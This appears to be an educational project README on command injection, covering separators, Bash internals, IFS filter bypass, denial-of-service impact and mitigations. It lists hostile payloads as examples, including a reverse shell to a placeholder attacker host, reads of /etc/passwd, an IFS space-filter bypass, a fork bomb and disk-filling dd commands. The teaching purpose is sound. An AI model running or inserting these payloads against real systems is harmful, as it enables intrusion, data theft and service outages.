Command Injection & Bash Fundamentals
🛡️ Project Overview

This project explores the mechanics of Command Injection vulnerabilities, Bash scripting internals like IFS, and the security implications of improper input handling in web applications.
🔍 1. Understanding Command Injection
What is Command Injection?

Command Injection is a critical security vulnerability that occurs when an application passes unsafe user-supplied data (forms, cookies, HTTP headers, etc.) to a system shell. An attacker can use this to execute arbitrary operating system (OS) commands with the privileges of the application.
How It Works

If a backend script uses a function like system() or exec() to run a command (e.g., ping [user_input]), an attacker can use command separators to terminate the original command and start their own.

Example:

    Expected Input: 8.8.8.8 -> Result: ping 8.8.8.8

    Malicious Input: 8.8.8.8 ; whoami -> Result: ping 8.8.8.8 followed by the execution of whoami.

🚀 2. Common Payloads & Attack Vectors
Common Payloads

    Information Gathering: whoami, id, uname -a, ifconfig

    File Discovery: ls -la, find / -name "*.conf"

    Sensitive Data: cat /etc/passwd, type C:\Windows\win.ini

    Persistence (Reverse Shell): bash -i >& /dev/tcp/attacker_ip/port 0>&1

Attack Vectors

    Input Fields: Search bars and contact forms.

    URL Parameters: Data passed via GET/POST requests.

    HTTP Headers: User-Agent, Referer, or Cookie values used in logging.

    File Uploads: Exploiting filenames that are processed by system commands.

🐚 3. Bash Internals
Bash Special Variables

    $0: Name of the script.

    $1, $2...: Positional arguments passed to the script.

    $?: Exit status of the last executed command (0 = success).

    $$: Process ID (PID) of the current shell.

Logical Operators: && vs ;

    Semicolon (;): Executes the second command regardless of whether the first one succeeded.

    Logical AND (&&): Executes the second command only if the first command returned an exit status of 0 (success).

⚙️ 4. The Internal Field Separator (IFS)
What is IFS?

The IFS is a special shell variable that determines how Bash splits words and recognizes boundaries during text processing. By default, it includes space, tab, and newline.
Manipulating IFS for Exploitation

Hackers use ${IFS} to bypass filters that block space characters.

    Standard: cat /etc/passwd (Blocked if spaces are filtered)

    Bypass: cat${IFS}/etc/passwd (Executes successfully)

⚠️ 5. Impact: Denial of Service (DoS)

A successful command injection can lead to a Denial of Service by exhausting system resources:

    Fork Bomb: :(){ :|:& };: (Creates infinite processes until the system crashes).

    Disk Exhaustion: dd if=/dev/zero of=file.txt bs=1G count=100 (Fills the hard drive).

    Process Termination: killall [service_name] (Stops critical web services).

🔒 6. Security & Mitigation

To secure web applications against command injection:

    Input Validation: Use a whitelist approach to allow only known-good characters.

    Avoid Shell Functions: Use built-in language APIs (e.g., Python's subprocess with shell=False) instead of os.system().

    Principle of Least Privilege: Run the web server under a low-privileged user (e.g., www-data).

    Escape Input: If you must use a shell, use functions designed to escape shell metacharacters.

🛠️ Redirection Cheat Sheet

    > : Redirects output to a file (Overwrites).

    >> : Redirects output to a file (Appends).

    < : Redirects a file's content into a command.

    2> : Redirects Error messages only.

    | : Passes the output of one command as input to another (Piping).
